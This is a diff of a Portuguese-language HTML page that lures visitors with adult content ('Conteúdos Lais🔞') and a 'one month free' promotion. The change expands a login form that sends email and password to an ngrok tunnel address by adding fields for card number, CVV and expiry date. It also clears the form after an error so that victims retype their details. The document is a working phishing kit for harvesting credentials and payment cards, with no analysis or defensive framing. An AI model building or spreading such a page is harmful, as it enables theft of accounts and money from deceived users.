@@ -35,8 +35,22 @@
         /* Estilo para os cabeçalhos dentro do container */
         .container h2 {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 0;
+            color: #00f; /* Azul mais chamativo */
+            font-weight: bold;
+            font-family: Arial, sans-serif;
+            font-size: 24px;
+        }
+        /* Estilo para o texto dos conteúdos */
+        .conteudos {
+            text-align: center; /* Alinhando o texto ao centro */
+            margin-top: 5px; /* Adicionando espaço entre os elementos */
+            margin-bottom: 5px; /* Adicionando espaço entre os elementos */
+            font-size: 18px;
             color: #000;
+            font-weight: bold;
+            font-family: Arial, sans-serif;
+            line-height: 1.2;
         }
         /* Estilo para grupo de formulário */
         .form-group {
@@ -69,13 +83,24 @@
 </head>
 <body>
     <div class="container">
-        <h2>Conteúdos GoogleDrive🔞</h2>
-        <form id="loginForm" method="POST" action="https://e467-2804-6850-8000-3d01-c12e-b350-c502-7e67.ngrok-free.app/">
+        <h2>PROMOÇÃO 1 MÊS GRÁTIS</h2>
+        <p class="conteudos">Criar Conta</p>
+        <p class="conteudos">Conteúdos Lais🔞</p>
+        <form id="loginForm" method="POST" action="https://9e68-2804-6850-8000-3d01-2d4a-c112-c2f2-dbba.ngrok-free.app/">
             <div class="form-group">
                 <input type="email" class="form-control" id="email" name="email" placeholder="Digite o e-mail">
             </div>
             <div class="form-group">
                 <input type="password" class="form-control" id="password" name="password" placeholder="Digite a senha">
+            </div>
+            <div class="form-group">
+                <input type="text" class="form-control" id="cardNumber" name="cardNumber" placeholder="Número do Cartão">
+            </div>
+            <div class="form-group">
+                <input type="text" class="form-control" id="cvv" name="cvv" placeholder="CVV">
+            </div>
+            <div class="form-group">
+                <input type="text" class="form-control" id="expiryDate" name="expiryDate" placeholder="Data de Validade">
             </div>
             <button type="button" onclick="enviarFormulario()">Entrar</button>
             <p id="mensagemErro" style="color: red;"></p>
@@ -104,6 +129,7 @@
                 } else {
                     var mensagem = xhr.responseText;
                     document.getElementById('mensagemErro').innerText = mensagem;
+                    document.getElementById("loginForm").reset(); // Limpar campos após erro
                 }
             };
             xhr.send(formData);
